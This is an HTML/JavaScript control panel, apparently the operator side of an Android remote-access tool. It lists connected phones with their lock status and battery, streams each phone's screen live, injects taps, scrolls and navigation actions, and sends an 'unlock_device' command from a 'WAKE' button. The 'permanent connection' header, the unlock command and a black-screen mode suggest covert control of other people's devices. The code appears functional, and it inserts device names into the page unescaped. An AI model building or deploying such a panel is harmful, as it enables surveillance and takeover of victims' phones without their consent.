<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control - Live View</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
        
        body { font-family: 'Roboto', sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
        .view { display: none; width: 100%; height: 100%; }
        .view.active { display: flex; flex-direction: column; }
        #device-list-view { flex-direction: column; }
        .header { background-color: #1e1e1e; padding: 15px 20px; text-align: center; border-bottom: 2px solid #00ff00; flex-shrink: 0; }
        .header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 2em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        #device-list-container { padding: 20px; overflow-y: auto; flex-grow: 1; }
        #device-list { list-style: none; padding: 0; margin: 0; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
        .device { background-color: #1e1e1e; border-radius: 10px; border-left: 5px solid #555; padding: 20px; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: space-between; align-items: center; }
        .device:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border-left-color: #00ff00; }
        .device-name { font-size: 1.3em; font-weight: 700; }
        .device-info { font-size: 0.9em; color: #aaa; }
        .status-dot { height: 15px; width: 15px; background-color: #28a745; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #28a745; }
        .lock-badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; margin-left: 10px; }
        .lock-badge.unlocked { background: #44ff44; }
        #control-view { flex-direction: column; }
        .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; flex-wrap: wrap; gap: 10px; flex-shrink: 0; }
        #back-to-list-btn { background-color: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 1em; }
        #device-title { font-size: 1.2em; font-weight: bold; }
        .lock-info { background: #2a2a2a; padding: 5px 10px; border-radius: 5px; font-size: 0.9em; }
        .screen-toggle-buttons { display: flex; gap: 10px; }
        .screen-toggle-btn { background: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 0.9em; transition: all 0.3s; }
        .screen-toggle-btn:hover { background: #555; }
        .screen-toggle-btn.active { background: #00ff00; color: #000; border-color: #00ff00; }
        .main-container { display: flex; flex-grow: 1; min-height: 0; overflow: hidden; }
        .screen-area { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 15px; position: relative; overflow: auto; }
        .screen-viewport { border: 3px solid #444; border-radius: 10px; background-color: #000; box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; position: relative; max-width: 95%; max-height: 95%; display: flex; align-items: center; justify-content: center; }
        .screen-container { position: relative; background-color: #000; transform-origin: top left; overflow: hidden; max-width: 100%; max-height: 100%; }
        .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
        .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
        .live-screen-image { width: 100%; height: 100%; object-fit: contain; background-color: #000; cursor: crosshair; }
        .all-controls { width: 80px; background-color: #1e1e1e; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; gap: 12px; padding: 20px 10px; flex-shrink: 0; overflow-y: auto; }
        .control-button { width: 55px; height: 55px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 50%; cursor: pointer; font-size: 24px; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .control-button:hover { background-color: #555; }
        .divider { height: 1px; width: 80%; background-color: #444; margin: 10px 0; }
        .single-main-btn { background: linear-gradient(135deg, #0066cc, #0099ff); color: white; border: none; padding: 12px 25px; border-radius: 8px; font-size: 1.1em; font-weight: bold; cursor: pointer; box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4); transition: all 0.3s; display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
        .single-main-btn:hover { background: linear-gradient(135deg, #0099ff, #00ccff); transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6); }
        .status-indicator { display: flex; align-items: center; gap: 5px; font-size: 0.9em; flex-shrink: 0; }
        .live-indicator { width: 10px; height: 10px; background-color: #ff4444; border-radius: 50%; animation: pulse 1.5s infinite; }
        .live-indicator.active { background-color: #44ff44; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
        .connection-status { display: flex; align-items: center; gap: 5px; font-size: 0.9em; padding: 5px 10px; border-radius: 5px; background: #2a2a2a; }
        .connection-dot { width: 8px; height: 8px; border-radius: 50%; }
        .connection-dot.connected { background-color: #44ff44; box-shadow: 0 0 8px #44ff44; }
        .connection-dot.disconnected { background-color: #ff4444; box-shadow: 0 0 8px #ff4444; }
        .connection-stats { font-size: 0.8em; color: #aaa; margin-top: 2px; }
        .screen-content { display: none; width: 100%; height: 100%; }
        .screen-content.active { display: block; }
    </style>
</head>
<body>

    <div id="device-list-view" class="view active">
        <div class="header"><h1>üîì PERMANENT CONNECTION CONTROL</h1></div>
        <div id="device-list-container"><ul id="device-list"></ul></div>
    </div>

    <div id="control-view" class="view">
        <div class="control-header">
            <button id="back-to-list-btn">‚Üê Back</button>
            <h2 id="device-title"></h2>
            <div class="lock-info" id="lock-status">Lock: Unknown</div>
            <div class="screen-toggle-buttons">
                <button id="btn-black-screen" class="screen-toggle-btn">üì¶ Elements</button>
                <button id="btn-live-screen" class="screen-toggle-btn active">üì± Live</button>
            </div>
            <div class="status-indicator">
                <div id="live-indicator" class="live-indicator"></div>
                <span id="stream-status">Stream: Off</span>
            </div>
            <div class="connection-status">
                <div id="connection-dot" class="connection-dot disconnected"></div>
                <span id="connection-status-text">...</span>
                <div class="connection-stats" id="connection-stats"></div>
            </div>
            <button id="btn-wake-unlock" class="single-main-btn">‚ö° WAKE</button>
        </div>
        <div class="main-container">
            <div class="screen-area">
                <div id="black-screen-viewport" class="screen-viewport" style="display: none;">
                    <div id="black-screen-container" class="screen-container"></div>
                </div>
                <div id="live-screen-viewport" class="screen-viewport" style="display: block;">
                    <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
                </div>
            </div>
            <div class="all-controls">
                <button class="control-button" id="btn-scroll-up">‚Üë</button>
                <button class="control-button" id="btn-scroll-left">‚Üê</button>
                <button class="control-button" id="btn-scroll-right">‚Üí</button>
                <button class="control-button" id="btn-scroll-down">‚Üì</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-back">‚Æå</button>
                <button class="control-button" id="btn-home">‚åÇ</button>
                <button class="control-button" id="btn-recents">‚ñ°</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-start-stream">‚ñ∂Ô∏è</button>
                <button class="control-button" id="btn-stop-stream">‚è∏Ô∏è</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io({
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            randomizationFactor: 0.5
        });

        const UIElements = {
            deviceListView: document.getElementById('device-list-view'),
            controlView: document.getElementById('control-view'),
            deviceList: document.getElementById('device-list'),
            deviceTitle: document.getElementById('device-title'),
            lockStatus: document.getElementById('lock-status'),
            backToListBtn: document.getElementById('back-to-list-btn'),
            blackScreenBtn: document.getElementById('btn-black-screen'),
            liveScreenBtn: document.getElementById('btn-live-screen'),
            blackScreenViewport: document.getElementById('black-screen-viewport'),
            liveScreenViewport: document.getElementById('live-screen-viewport'),
            blackScreenContainer: document.getElementById('black-screen-container'),
            liveScreenImage: document.getElementById('live-screen-image'),
            connectionDot: document.getElementById('connection-dot'),
            connectionStatusText: document.getElementById('connection-status-text'),
            connectionStats: document.getElementById('connection-stats'),
            liveIndicator: document.getElementById('live-indicator'),
            streamStatus: document.getElementById('stream-status'),
        };

        let state = {
            devices: {},
            activeDeviceId: null,
            connectionStartTime: 0,
            isLiveStreaming: false,
            currentScreenView: 'live'
        };

        function showView(viewId) {
            UIElements.deviceListView.classList.remove('active');
            UIElements.controlView.classList.remove('active');
            document.getElementById(viewId).classList.add('active');
        }

        function switchScreenView(viewType) {
            state.currentScreenView = viewType;
            if (viewType === 'black') {
                UIElements.blackScreenBtn.classList.add('active');
                UIElements.liveScreenBtn.classList.remove('active');
                UIElements.blackScreenViewport.style.display = 'block';
                UIElements.liveScreenViewport.style.display = 'none';
                stopLiveStream();
            } else {
                UIElements.blackScreenBtn.classList.remove('active');
                UIElements.liveScreenBtn.classList.add('active');
                UIElements.blackScreenViewport.style.display = 'none';
                UIElements.liveScreenViewport.style.display = 'block';
                startLiveStream();
            }
        }

        function sendCommand(action, payload = {}) {
            if (!state.activeDeviceId || !socket.connected) return;
            socket.emit('command_to_device', { deviceId: state.activeDeviceId, action, payload });
        }

        function startLiveStream() {
            if (state.isLiveStreaming) return;
            state.isLiveStreaming = true;
            sendCommand('start_live_stream');
            UIElements.liveIndicator.classList.add('active');
            UIElements.streamStatus.textContent = 'Stream: On';
        }

        function stopLiveStream() {
            if (!state.isLiveStreaming) return;
            state.isLiveStreaming = false;
            sendCommand('stop_live_stream');
            UIElements.liveIndicator.classList.remove('active');
            UIElements.streamStatus.textContent = 'Stream: Off';
        }

        function updateDeviceInList(device) {
            state.devices[device.deviceId] = { ...state.devices[device.deviceId], ...device };
            let li = document.getElementById(`device-${device.deviceId}`);
            if (!li) {
                li = document.createElement('li');
                li.className = 'device';
                li.id = `device-${device.deviceId}`;
                li.addEventListener('click', () => {
                    state.activeDeviceId = device.deviceId;
                    UIElements.deviceTitle.textContent = device.deviceName;
                    UIElements.lockStatus.textContent = `Lock: ${device.lockType || 'Unknown'}`;
                    showView('control-view');
                    switchScreenView('live');
                });
                UIElements.deviceList.appendChild(li);
            }
            li.innerHTML = `
                <div>
                    <div class="device-name">${device.deviceName}</div>
                    <div class="device-info">Android: ${device.androidVersion} | üîã <span class="battery-level">${device.battery || 'N/A'}</span>%</div>
                </div>
                <div style="display: flex; align-items: center;">
                    <span class="lock-badge ${device.lockType !== 'locked' ? 'unlocked' : ''}">${device.lockType || 'none'}</span>
                    <span class="status-dot"></span>
                </div>
            `;
        }

        socket.on('connect', () => {
            console.log('‚úÖ Connected to server!');
            UIElements.connectionDot.className = 'connection-dot connected';
            UIElements.connectionStatusText.textContent = 'Connected';
            state.connectionStartTime = Date.now();
            socket.emit('admin_join');
        });

        socket.on('disconnect', () => {
            console.error('‚ùå Disconnected from server!');
            UIElements.connectionDot.className = 'connection-dot disconnected';
            UIElements.connectionStatusText.textContent = 'Disconnected';
        });

        socket.on('device_list', (initialDevices) => {
            UIElements.deviceList.innerHTML = '';
            state.devices = {};
            initialDevices.forEach(updateDeviceInList);
        });

        socket.on('new_device_joined', updateDeviceInList);

        socket.on('device_disconnected', (deviceId) => {
            const el = document.getElementById(`device-${deviceId}`);
            if (el) el.remove();
            delete state.devices[deviceId];
            if (state.activeDeviceId === deviceId) {
                showView('device-list-view');
                state.activeDeviceId = null;
            }
        });

        socket.on('device_heartbeat', (data) => {
            if (state.devices[data.deviceId]) {
                updateDeviceInList(data);
                if (data.deviceId === state.activeDeviceId) {
                    UIElements.lockStatus.textContent = `Lock: ${data.lockType || 'Unknown'}`;
                }
            }
        });

        socket.on('screen_update', (data) => {
            if (data.deviceId !== state.activeDeviceId || state.currentScreenView !== 'black') return;
            // Black screen logic can be added here if needed
        });

        socket.on('live_screen', (data) => {
            if (data.deviceId !== state.activeDeviceId || state.currentScreenView !== 'live') return;
            UIElements.liveScreenImage.src = `data:image/jpeg;base64,${data.liveImage}`;
        });

        UIElements.backToListBtn.onclick = () => {
            stopLiveStream();
            state.activeDeviceId = null;
            showView('device-list-view');
        };
        UIElements.blackScreenBtn.onclick = () => switchScreenView('black');
        UIElements.liveScreenBtn.onclick = () => switchScreenView('live');
        
        UIElements.liveScreenImage.addEventListener('click', (e) => {
            const rect = e.target.getBoundingClientRect();
            const scaleX = e.target.naturalWidth / rect.width;
            const scaleY = e.target.naturalHeight / rect.height;
            const x = Math.round((e.clientX - rect.left) * scaleX);
            const y = Math.round((e.clientY - rect.top) * scaleY);
            sendCommand('touch_command', { x, y });
        });

        document.getElementById('btn-start-stream').onclick = startLiveStream;
        document.getElementById('btn-stop-stream').onclick = stopLiveStream;
        document.getElementById('btn-wake-unlock').onclick = () => sendCommand('unlock_device');
        document.getElementById('btn-back').onclick = () => sendCommand('global_action', { action: 'back' });
        document.getElementById('btn-home').onclick = () => sendCommand('global_action', { action: 'home' });
        document.getElementById('btn-recents').onclick = () => sendCommand('global_action', { action: 'recents' });
        document.getElementById('btn-scroll-up').onclick = () => sendCommand('scroll_action', { direction: 'up' });
        document.getElementById('btn-scroll-down').onclick = () => sendCommand('scroll_action', { direction: 'down' });
        document.getElementById('btn-scroll-left').onclick = () => sendCommand('scroll_action', { direction: 'left' });
        document.getElementById('btn-scroll-right').onclick = () => sendCommand('scroll_action', { direction: 'right' });

        setInterval(() => {
            if (socket.connected) {
                const uptime = Math.floor((Date.now() - state.connectionStartTime) / 1000);
                UIElements.connectionStats.textContent = `Uptime: ${uptime}s`;
            }
        }, 1000);
    </script>
</body>
</html>
